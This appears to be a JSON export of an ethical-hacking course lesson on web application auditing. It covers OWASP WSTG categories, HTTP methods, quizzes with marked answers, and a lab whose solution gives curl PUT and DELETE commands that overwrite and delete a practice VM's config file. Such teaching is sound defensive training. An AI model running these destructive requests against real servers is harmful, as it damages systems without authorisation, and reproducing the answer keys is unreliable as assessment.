@@ -1,0 +1,1997 @@
+{
+  "data": {
+    "lesson": {
+      "id": 1089751,
+      "key": "a25ee65c-5606-4006-8085-b1656a092846",
+      "title": "Application Auditing",
+      "semantic_type": "Lesson",
+      "is_public": true,
+      "version": "1.0.0",
+      "locale": "en-us",
+      "summary": "Use OWASP WTG methodologies, create HTTP requests to access target systems and employ semi-automated and fully-automated tools in applications audits",
+      "lesson_type": null,
+      "display_workspace_project_only": false,
+      "resources": {
+        "files": [
+          {
+            "name": "Videos Zip File",
+            "uri": "https://zips.udacity-data.com/a25ee65c-5606-4006-8085-b1656a092846/1089751/1614205784835/Application+Auditing+Videos.zip"
+          },
+          {
+            "name": "Transcripts Zip File",
+            "uri": "https://zips.udacity-data.com/a25ee65c-5606-4006-8085-b1656a092846/1089751/1614205779428/Application+Auditing+Subtitles.zip"
+          }
+        ],
+        "google_plus_link": null,
+        "career_resource_center_link": null,
+        "coaching_appointments_link": null,
+        "office_hours_link": null,
+        "aws_provisioning_link": null
+      },
+      "project": null,
+      "lab": null,
+      "concepts": [
+        {
+          "id": 1089650,
+          "key": "4b5556cc-edbc-4f4f-b294-5e5286c7ad06",
+          "title": "Introduction",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "4b5556cc-edbc-4f4f-b294-5e5286c7ad06",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089646,
+              "key": "cad4e477-9568-44ef-956d-4da145b33646",
+              "title": "Introduction Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Application Auditing",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089647,
+              "key": "712969c1-6790-41eb-95ab-e05f07e49fe0",
+              "title": "ND350 EHND C1 L3 A01 Introduction V2",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "6Y2qWPn5dwE",
+                "china_cdn_id": "6Y2qWPn5dwE.mp4"
+              }
+            },
+            {
+              "id": 1089648,
+              "key": "e341333e-3f59-4f5c-878d-3da9e24a194d",
+              "title": "Introduction Summary",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "In this lesson, we will be looking at web application auditing.  We will focus on:\n\n1. OWASP WSTG\n1. Request and Response\n1. Semi-Automated Tools\n1. Fully Automated Tools\n\nWe will finish this lesson by discussing the vast array of devices that can and should be audited and some best practices for keeping up in this rapidly evolving field.\n\nBy the end of the lesson, you will be able to:\n\n* Send requests to a web application and analyze the response that comes back\n* Test web applications using OWASP WSTG\n* Use semi-automated and fully automated tools",
+              "instructor_notes": ""
+            }
+          ]
+        },
+        {
+          "id": 1122384,
+          "key": "50249d6f-2e52-4075-9cbb-08b74ab54645",
+          "title": "Intro to Application Auditing",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "50249d6f-2e52-4075-9cbb-08b74ab54645",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1127769,
+              "key": "fdee318f-950a-4c1d-a66e-996b87b9ccbe",
+              "title": "ND350 EHND C1 L3 A02 How Experts Approach Web App Testing Part 1 V2",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "0J7pOc3PQGI",
+                "china_cdn_id": "0J7pOc3PQGI.mp4"
+              }
+            },
+            {
+              "id": 1122387,
+              "key": "83248e09-55f4-4d61-a206-af963c780767",
+              "title": "How Experts Approach Application Audit Summary",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Why Is Application Auditing Important?\n\nWeb applications are a huge part of any organization's infrastructure, so it is critical to audit their security.\n\n## How Is Application Auditing Different From Systems Auditing?\n\nAuditing web apps is different from auditing systems because we need to look for vulnerabilities in the code and deployment instead of looking at services and ports.",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1122389,
+              "key": "b37fc0c5-452d-4868-a001-0930567e9d18",
+              "title": null,
+              "semantic_type": "ImageAtom",
+              "is_public": true,
+              "url": "https://video.udacity-data.com/topher/2020/December/5fe369af_2/2.png",
+              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/b37fc0c5-452d-4868-a001-0930567e9d18",
+              "caption": "System Auditing vs Application Auditing",
+              "alt": "System Audit looks for vulnerabilities in services and ports while an Application audit focuses on code and deployment",
+              "width": 947,
+              "height": 387,
+              "instructor_notes": null
+            },
+            {
+              "id": 1127771,
+              "key": "01070320-5d41-4d6e-aee1-d6019ea5a5bf",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## OWASP Web Security Testing Guide\n\nThe <a href=\"https://owasp.org/www-project-web-security-testing-guide/v41/\" target=\"_blank\">OWASP Web Security Testing Guide</a> provides critical guidance for testing web applications.  OWASP WSTG 4.1 includes more than one hundred tests in eleven categories.\n\n### WSTG Categories\n\n* <a href=\"https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/01-Information_Gathering/README.html\" target=\"_blank\">Information Gathering</a>:  similar to the reconnaissance phase of system testing\n* <a href=\"https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/README.html\" target=\"_blank\">Configuration and Deployment Management Testing</a>:  related to securely configuring and deploying the web app on the internet\n* <a href=\"https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/03-Identity_Management_Testing/README.html\" target=\"_blank\">Identity Management Testing</a>: tests for usernames and user registration.\n* <a href=\"https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/04-Authentication_Testing/README.html\" target=\"_blank\">Authentication Testing</a>: tests related passwords and other authentication mechanisms",
+              "instructor_notes": null
+            },
+            {
+              "id": 1127795,
+              "key": "acb77b26-bc46-4842-877c-e1a731b21044",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## More WSTG Categories",
+              "instructor_notes": null
+            },
+            {
+              "id": 1127796,
+              "key": "4fc1ce58-026f-4740-ad51-7c0168a9d3ef",
+              "title": "ND350 EHND C1 L3 A02 How Experts Approach Web App Testing Part 2",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "video": {
+                "youtube_id": "KXa9Z1kf_AU",
+                "china_cdn_id": "KXa9Z1kf_AU.mp4"
+              }
+            },
+            {
+              "id": 1127770,
+              "key": "3d70592f-38ea-41a3-aa16-0a748d8d0085",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "* <a href=\"https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/05-Authorization_Testing/README.html\" target=\"_blank\">Authorization Testing</a>:  tests related to the access level of the user.\n* <a href=\"https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/06-Session_Management_Testing/README.html\" target=\"_blank\">Session Management Testing</a>: how the web app manages a user login session.\n* <a href=\"https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/README.html\" target=\"_blank\">Input Validation Testing</a>:  tests related to user input and validation on the web application and server\n* <a href=\"https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/README.html\" target=\"_blank\">Testing for Error Handling</a>:  deals with the web application’s behavior when an error occurs\n* <a href=\"https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/README.html\" target=\"_blank\">Testing for Weak Cryptography</a>:  looks at encryption and hashing algorithms for data storage and transit\n* <a href=\"https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/10-Business_Logic_Testing/README.html\" target=\"_blank\">Business Logic Testing</a>:  considers how the app reacts in both typical situations and edge cases when users do something unexpected or unusual\n* <a href=\"https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/README.html\" target=\"_blank\">Client-Side Testing</a>:  tests the application against attacks where server-side processing isn't required\n\n<hr>",
+              "instructor_notes": null
+            },
+            {
+              "id": 1122390,
+              "key": "65b9ac36-f525-44c1-a323-7300024f8db0",
+              "title": "Question",
+              "semantic_type": "RadioQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "65b9ac36-f525-44c1-a323-7300024f8db0",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "True or False: a system audit should always be done before doing an application-level audit",
+                "answers": [
+                  {
+                    "id": "a1605872446209",
+                    "text": "True",
+                    "is_correct": true
+                  },
+                  {
+                    "id": "a1605872607901",
+                    "text": "False",
+                    "is_correct": false
+                  }
+                ]
+              }
+            },
+            {
+              "id": 1127775,
+              "key": "ac4ae76a-4cb8-4e2d-baba-b55939b642c1",
+              "title": "Why Web Application Auditing? Quiz",
+              "semantic_type": "RadioQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "ac4ae76a-4cb8-4e2d-baba-b55939b642c1",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "While auditing a system's security, we scan for open ports, find the services running on those ports and then do vulnerability research on the services. Why can't this approach be used for web applications?",
+                "answers": [
+                  {
+                    "id": "a1608874307251",
+                    "text": "Web Application testing requites deep knowledge of scripting & programming knowledge",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "a1608874328649",
+                    "text": "Testing web apps is more complex than testing other systems",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "a1608874341179",
+                    "text": "Web Apps have a different architecture which requires a different testing approach",
+                    "is_correct": true
+                  }
+                ]
+              }
+            },
+            {
+              "id": 1127777,
+              "key": "6fd4359e-21f0-419e-adc0-37b9258ec96a",
+              "title": "How Experts Approach Application Audit Quiz 2",
+              "semantic_type": "CheckboxQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "6fd4359e-21f0-419e-adc0-37b9258ec96a",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "While testing an application's password reset functionality, you discovered that the password reset can be performed by receiving a ***One Time Password (OTP)***  on your registered mobile number. You also discovered that there is no limit on how many times an OTP can be requested. Further, there is no account lockout when someone enters an invalid OTP. Which two categories are best suited for this situation?",
+                "answers": [
+                  {
+                    "id": "rbk1",
+                    "text": "Identity Management Testing",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "rbk2",
+                    "text": "Client-Side Testing",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "4f87eb06-b1f3-43b5-a5ba-7585a224aa20",
+                    "text": "Business Logic Testing",
+                    "is_correct": true
+                  },
+                  {
+                    "id": "5b3b0df6-2188-4e5b-9447-76d8de347b3a",
+                    "text": "Authentication Testing",
+                    "is_correct": true
+                  }
+                ]
+              }
+            },
+            {
+              "id": 1127808,
+              "key": "994377aa-1217-4819-86cc-f7c18ec050d2",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Further Research\n\nIn this video from GOTO 2018, Philippe De Ryck discusses the top ten web application security risks and the OWASP Application Security Verification Standard:    <a href=\"https://www.youtube.com/watch?v=Gnxk_uf6qTQ&amp;feature=youtu.be\" target=\"_blank\">GOTO 2018 • From the OWASP Top Ten(s) to the OWASP ASVS</a>.\n\nThis article from the Alpine Security blog discusses why web application auditing is necessary - <a href=\"https://alpinesecurity.com/blog/web-application-penetration-testing-why-its-necessary-and-what-you-need-to-know/\" target=\"_blank\">Web Application Penetration Testing: Why It’s Necessary and What You Need to Know</a>.",
+              "instructor_notes": null
+            }
+          ]
+        },
+        {
+          "id": 1089671,
+          "key": "db532dfc-f3ab-41e6-8c98-8ae0f5334f51",
+          "title": "Request and Response",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "db532dfc-f3ab-41e6-8c98-8ae0f5334f51",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089665,
+              "key": "645cbe8a-1aeb-470f-a843-f6397cce2183",
+              "title": "Request And Response Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## How a Web App Works",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089666,
+              "key": "76af65d2-c507-4370-b5a1-cffcfc4c908e",
+              "title": "ND350 EHND C1 L3 A03a Request And Response V3",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "xn-0MP_RvAc",
+                "china_cdn_id": "xn-0MP_RvAc.mp4"
+              }
+            },
+            {
+              "id": 1122400,
+              "key": "84d1494d-adc8-4415-bd45-e355af75a882",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## HTTP Request and Response\n\nWhen a user opens a URL:\n\n1. A request is generated by the browser.\n1. The request is sent to the server that is hosting the application.\n1. The server processes the request\n1. A response is sent back to the user.",
+              "instructor_notes": null
+            },
+            {
+              "id": 1122401,
+              "key": "089849b0-a825-48e9-9728-e477ddd886ba",
+              "title": null,
+              "semantic_type": "ImageAtom",
+              "is_public": true,
+              "url": "https://video.udacity-data.com/topher/2020/December/5fe598e1_3/3.png",
+              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/089849b0-a825-48e9-9728-e477ddd886ba",
+              "caption": "HTTP Request and Response",
+              "alt": "Browser sends a request to the application and the server sends a response back",
+              "width": 874,
+              "height": 239,
+              "instructor_notes": null
+            },
+            {
+              "id": 1122402,
+              "key": "03ece55d-ab3d-4c3f-8ff4-8d3fad345d72",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "A typical HTTP request includes:\n\n* The **HTTP Request Method**, **the resource location**, and the **HTTP version**\n* The **Host **header, which tells us where the request is sent to \n* Other headers, which include information about the accepted language, the content type, the length of the content, and more\n* The request **body**:  information sent with the request.  This is also called the **payload**.",
+              "instructor_notes": null
+            },
+            {
+              "id": 1122403,
+              "key": "87f9fa4c-2434-4193-94e0-823a26cdf3fc",
+              "title": null,
+              "semantic_type": "ImageAtom",
+              "is_public": true,
+              "url": "https://video.udacity-data.com/topher/2020/December/5fe5994a_4/4.png",
+              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/87f9fa4c-2434-4193-94e0-823a26cdf3fc",
+              "caption": "Anatomy of an HTTP Request",
+              "alt": "The Anatomy of an HTTP Request",
+              "width": 630,
+              "height": 365,
+              "instructor_notes": null
+            },
+            {
+              "id": 1129805,
+              "key": "7d0f8438-8990-47e6-bde0-5ac2d2ff1e85",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Common Request Methods and Response Codes",
+              "instructor_notes": null
+            },
+            {
+              "id": 1129804,
+              "key": "89d3d55f-05cd-4cde-9ed6-af6bcd99f039",
+              "title": "ND350 EHND C1 L3 A03b Request Methods V2",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "video": {
+                "youtube_id": "ZonBLBHAYAg",
+                "china_cdn_id": "ZonBLBHAYAg.mp4"
+              }
+            },
+            {
+              "id": 1089667,
+              "key": "03b7e16d-d219-44a3-b1af-73521094dfe8",
+              "title": "Request And Response Notes",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Common HTTP Methods\n\n* **GET **is used for retrieving information or fetching data from the server\n* **POST **is used to transmit data to the server, including sensitive data like passwords\n* **PUT **is used to upload/update files on the webserver\n* **DELETE **is used to delete a resource on the webserver\n* **HEAD** is used to get the information about the response instead of the response itself\n* **OPTIONS **tells us which other types of methods can be sent on the webserver",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1125174,
+              "key": "cdfdb08e-8e29-495e-9161-cad50fcd29ce",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Using `curl`\n\n`curl` is a command-line tool that allows us to send HTTP requests and analyze the response received.\n\nThe basic syntax for  `curl` is:\n\n```\ncurl -X <request method> <target> <options>\n```\n\nUse `curl -h` to see all of the available options.",
+              "instructor_notes": null
+            },
+            {
+              "id": 1125175,
+              "key": "16530a2a-7fbc-4aea-a485-ea94a58dd30b",
+              "title": "Request And Response Notes",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Common HTTP Response Codes\n\n* Any response code in the **range of 100 is informational**\n* Any response code in the **range of 200 is accepted and understood**\n* Any response code in the **range of 300 is a Redirection**\n* Any response code in the **range of 400 is a Client-Side Error**\n* Any response code in the **range of 500 is a Server-Side Error**",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1127813,
+              "key": "4f4d86ba-8fa3-4e6d-95a7-bd666f60b97c",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### New Terms\n\n<div class=\"index-module--table-responsive--1zG6k\"><table class=\"index-module--table--8j68C index-module--table-striped--3HHC-\">\n<thead>\n<tr>\n<th>Term</th>\n<th>Definition</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>HTTP Request</td>\n<td>A request sent by the client to the server to perform actions on a specific resource URL. The action to be performed is defined by an HTTP Method.</td>\n</tr>\n<tr>\n<td>HTTP Response</td>\n<td>The reply from the server back to the client about the previously made request.</td>\n</tr>\n<tr>\n<td>Hypertext Transfer Protocol (HTTP)</td>\n<td>An application layer protocol used to exchange data over the internet</td>\n</tr>\n</tbody>\n</table>\n</div>",
+              "instructor_notes": null
+            },
+            {
+              "id": 1122950,
+              "key": "695ba708-4b56-4aba-aa7f-df20b17a2eee",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Further Reading\n\nThe OWASP <a href=\"https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods.html\" target=\"_blank\">Test HTTP Methods</a> includes several tests using HTTP methods to exploit a web application.",
+              "instructor_notes": null
+            }
+          ]
+        },
+        {
+          "id": 1089675,
+          "key": "6fead372-0fea-4d2e-ab59-d49cc06b8106",
+          "title": "Quizzes: Request and Response",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "6fead372-0fea-4d2e-ab59-d49cc06b8106",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089672,
+              "key": "5522e44c-bf25-413b-a88e-9d22989453d7",
+              "title": "Request And Response Quizzes Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "##  Thinking About Request And Response",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089674,
+              "key": "7c487d3e-b9ab-4650-94dc-00ae6673c8f8",
+              "title": "Request And Response Hard Quiz",
+              "semantic_type": "CheckboxQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "7c487d3e-b9ab-4650-94dc-00ae6673c8f8",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "Which HTTP methods can be dangerous? Select two.",
+                "answers": [
+                  {
+                    "id": "rbk1",
+                    "text": "`GET`",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "rbk2",
+                    "text": "`PUT`",
+                    "is_correct": true
+                  },
+                  {
+                    "id": "a1603721272067",
+                    "text": "`DELETE`",
+                    "is_correct": true
+                  },
+                  {
+                    "id": "a1603721277081",
+                    "text": "`POST`",
+                    "is_correct": false
+                  }
+                ]
+              }
+            },
+            {
+              "id": 1089673,
+              "key": "77a71d5f-71f3-406c-ae2d-64963bbb1e36",
+              "title": "Request And Response Easy Quiz",
+              "semantic_type": "RadioQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "77a71d5f-71f3-406c-ae2d-64963bbb1e36",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "While analyzing an application, you receive a `415` response code. What does this response code mean?  *Hint:  you may need to research this using the internet*",
+                "answers": [
+                  {
+                    "id": "rbk1",
+                    "text": "Redirection",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "rbk2",
+                    "text": "Bad Request",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "a1603720649361",
+                    "text": "Server Failure",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "a1603720806850",
+                    "text": "Unsupported Media Type",
+                    "is_correct": true
+                  }
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "id": 1089679,
+          "key": "11a9a6f9-02ff-486a-a0f8-ad4ae9a119f7",
+          "title": "Exercise: Request And Response",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "11a9a6f9-02ff-486a-a0f8-ad4ae9a119f7",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089676,
+              "key": "49022e24-4cad-4fb1-9db9-c66d999c6dda",
+              "title": "Exercise: Request And Response Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Using Request And Response",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089677,
+              "key": "d84d3426-46d9-432a-b10e-7d989de491dc",
+              "title": "Exercise: Request And Response Instructions",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "Your target for this exercise is the configuration database file of the SBVA virtual machine which is located at `http://sbva.local/includes/config.db`\n\nYour goal is to complete two tasks:\n\n1. Modify the contents  of the config file using a `PUT` request\n2. Delete the configuration file using a `DELETE` request\n\nYou can use `curl` to make both requests. As a reminder, the basic usage syntax for  `curl` is:\n```bash\ncurl -X <request method> <target> <options>\n```\n\nTo determine the exact `curl` statement to use, you may need to do further research.  Here are two suggestions\n- Run a `curl -h` command in your terminal to pull up the `curl` help menu\n- Search the internet search for the type of command  you want to run\n\n",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089678,
+              "key": "2ff0727e-a97c-4125-b18b-5dacd28882ea",
+              "title": "Testing http://sbva.local Against PUT  and DELETE",
+              "semantic_type": "TaskListAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "2ff0727e-a97c-4125-b18b-5dacd28882ea",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "tasks": [
+                "Run a `GET` request to fetch the contents of the config file",
+                "Check the request using the `--head` method to see the response code generated by the request",
+                "Check which methods are allowed by running an `OPTIONS` request",
+                "Save the contents of the `config.db` file to a local file on your analyst machine",
+                "Change the contents of the `config.db` file to set the production environment variable to `false`",
+                "Run a `PUT` request to replace the `config.db` file with the one you created and refresh the web app to see if it has changed",
+                "Run a `DELETE` request to delete the `config.db` file and crash the app and refresh the web app to see if it has changed"
+              ],
+              "positive_feedback": "Nice work!  You can see my solution on the next page",
+              "video_feedback": null,
+              "description": "Before you start this exercise, open up the SBVA virtual machine and open `http://sbva.local` in a browser. This is the web app you are targeting."
+            }
+          ]
+        },
+        {
+          "id": 1089684,
+          "key": "a1fe3bc2-8216-4a02-a6fe-9d37a67278a6",
+          "title": "Solution: Request And Response",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "a1fe3bc2-8216-4a02-a6fe-9d37a67278a6",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089680,
+              "key": "b525ccc2-fc8d-46c7-9c06-899a9697edca",
+              "title": "Solution: Request And Response Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## My Solution",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089681,
+              "key": "146a45ea-632a-43ea-85db-ebcde78486ec",
+              "title": "ND350 EHND C1 L3 A04 DELETE And PUT Against Configuration Database",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "UnjYjYu05Bk",
+                "china_cdn_id": "UnjYjYu05Bk.mp4"
+              }
+            },
+            {
+              "id": 1089682,
+              "key": "7507b7f9-6471-4cef-9e24-36c68271436e",
+              "title": "Solution: Request And Response Summary",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Solution: Request and Response\n\n1. Open a Terminal in your analyst machine and send a `GET` request to fetch the contents of the configuration file.\n```bash\ncurl -X GET http://sbva.local/includes/config.db\n```\n\nThis will return the contents of the file: `env.production=true` \n\n\n\n1. Check the response code by adding `--head` \n```bash\ncurl -X GET http://sbva.local/includes/config.db --head\n```\n\nThe  **200 OK** response code tells you that the resource exists and is accessible.\n\n\n\n1. Query the enabled HTTP Methods on the server using the `OPTIONS` method. \n```bash\ncurl -X OPTIONS http://sbva.local/includes/config.db. --head\n```\n\nThis will confirm that the `GET`,  `HEAD`,  `PUT` and `DELETE` methods are available.\n\n\n\n1. Create a `config.db` file on your analyst machine -- but set the contents to `env.production=false`\n\n\n1. Use a  `PUT` method to replace the config file with the one you created\n```bash\ncurl -X PUT -T config.db http://sbva.local/includes/config.db\n```\n\nIf you open the website in your browser you will now see a “Test Environment” message on the top right corner\n\n\n\n1. Use the `DELETE` method to delete the configuration file.\n```bash\ncurl -X DELETE http://sbva.local/includes/config.db\n```\n\nIf you open the website in your browser you will now get an error message stating that the config file is missing\n\n\n\n1. You can also verify the deletion by sending another GET request\n```bash\ncurl -X GET  http://sbva.local/includes/config.db\n```",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089683,
+              "key": "2095e8b3-c74d-40b4-a715-7a58aac20b69",
+              "title": "Thinking Like An Ethical Hacker",
+              "semantic_type": "ValidatedQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "2095e8b3-c74d-40b4-a715-7a58aac20b69",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "To complete this exercise, you had to do some research on how to use `curl` to write the commands you needed. Learning _how_ to do something for the first time is a big part of the Ethical Hacker's job.  We are always researching new vulnerabilities and learning new skills to exploit them. <br><br>**How did you feel when you were doing the research?<br>How did you feel when you figured it out? **",
+                "matchers": [
+                  {
+                    "expression": "[^/s]+"
+                  }
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "id": 1089691,
+          "key": "f6176836-f4a3-4da8-b757-9b833ecd4d21",
+          "title": "Using OWASP WSTG",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "f6176836-f4a3-4da8-b757-9b833ecd4d21",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089685,
+              "key": "54db7d94-e920-472c-b8b5-079a7313a610",
+              "title": "Using OWASP Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## OWASP Testing Guide",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089686,
+              "key": "9b843a51-a4f4-4c6d-9f53-16eaed766896",
+              "title": "ND350 EHND C1 L3 A05 Using OWASP WSTG",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "RNsuelNN2LE",
+                "china_cdn_id": "RNsuelNN2LE.mp4"
+              }
+            },
+            {
+              "id": 1089687,
+              "key": "2e777bb3-d280-43c2-b319-742d009977e2",
+              "title": "Using OWASP Notes",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "OWASP WSTG divides the tests into 11 categories with over 100+ tests. Each test is different but there are few common elements\n\n* **Test ID** is a unique number given to the specific test for documentation purposes.** **This always starts with WSTG followed by the category code, and then the test number in the category. Example - WSTG-BUSL-02 is the second test in *Business Logic *testing in WSTG. \n* **Summary Section** provides us a basic overview of what the test is all about, why the test is done, and sometimes. the exact location of the weakness.\n* **How To Test **is the most important element as it offers guidance on how to perform the test. WSTG provides detailed step by step instructions on how to perform the test with various test cases. These test cases are situations you may face with different applications and security mechanisms and WSTG offers various techniques that may be used by a security professional in those cases.\n* **References **to tools and further reading are optional elements but can be helpful while learning about a test. These may include semi-automated tools, fully-automated tools, and/or external resources with more detailed information on the vulnerability or the test.",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1122951,
+              "key": "c536a1f7-103b-4b01-9f97-762ff26ce7fd",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Further Reading\n\nYou can access the OWASP WSTG and read more about it on <a href=\"https://owasp.org/www-project-web-security-testing-guide/v41/\" target=\"_blank\">OWASP: WSTG 4.1</a>",
+              "instructor_notes": null
+            }
+          ]
+        },
+        {
+          "id": 1089695,
+          "key": "3ce336f9-8e86-4b27-85a3-1aff5728e1fa",
+          "title": "Quizzes: OWASP",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "3ce336f9-8e86-4b27-85a3-1aff5728e1fa",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089692,
+              "key": "90b55c8c-992c-462a-97f8-f2f320d0adf5",
+              "title": "Using OWASP Quizzes Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "##  Thinking About Using OWASP",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1090576,
+              "key": "da513f0b-ee1a-4c87-a88d-ca625bb51a5c",
+              "title": "Matching Quiz",
+              "semantic_type": "MatchingQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
